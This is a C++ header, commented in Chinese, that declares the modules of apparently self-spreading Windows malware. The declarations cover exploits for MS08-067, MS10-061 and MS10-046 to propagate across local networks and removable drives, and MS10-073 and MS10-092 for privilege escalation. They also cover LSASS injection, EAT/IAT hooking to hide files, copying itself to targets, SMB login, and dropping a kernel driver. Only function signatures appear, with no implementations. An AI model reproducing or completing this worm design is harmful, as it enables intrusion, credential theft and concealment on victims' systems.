#include<WinSock2.h>
#include<Windows.h>
#include<iostream>
#include<vector>
#include <TlHelp32.h>
#include<DbgHelp.h>
#include<string>

#pragma comment(lib,"ws2_32.lib")	//库文件


//模块入口相关函数
extern bool exp_main();
extern bool exp_ring3_hide_file();
extern bool exp_inject_lsass();
extern bool exp_ring0_get_priv();

typedef struct TargetInfo
{
    int dwMajorVersion;
    int dwMinorVersion;
    int dwProductType;
    BOOL bIsWow64;
};

//检查当前权限
extern bool check_target_info(TargetInfo&);
extern bool check_admin();

//tcp socket
extern int socket_connect(const char * host, int port, int protocol, int type);
extern int socket_close(int socket);

//smb协议
int smb_init(int s, char* name);
int smb_login(int s, char* login, char* password);

//内网传播：rpc漏洞
DWORD WINAPI exp_ms08_067(LPVOID lpParam);
//内网传播：打印机共享漏洞
DWORD WINAPI exp_ms10_061(LPVOID lpParam);
//移动存储传播：lnk文件漏洞
extern void exp_ms10_046();

/*
* 函数：键盘布局文件提权
* 参数isXp：标记目标系统是XP或win2000
*/
DWORD WINAPI exp_ms10_073(LPVOID lpParam);
//计划任务本地提权
extern bool exp_ms10_092();

//拷贝自身到目标目录
extern bool copy_self(wchar_t* dst);


extern bool LoadFromMemory(void);
//ring3层EAT hook 隐藏文件
typedef struct HookOne
{
    std::string API_Name;
    LPVOID      newFun;
    bool        isHook;
};
extern DWORD WINAPI APIHOOK(LPVOID lpParameter);
extern DWORD_PTR hookEAT(char libName[], char API_Name[], LPVOID newFun);
extern BOOL unhookEAT(char libName[], char API_Name[], LPVOID originalFuncAddress);
extern bool hookIAT(char moduleName[],char libName[], std::vector<HookOne> hookfunclist);


bool dropSysDriver();
bool loadSysDriver(wchar_t path[]);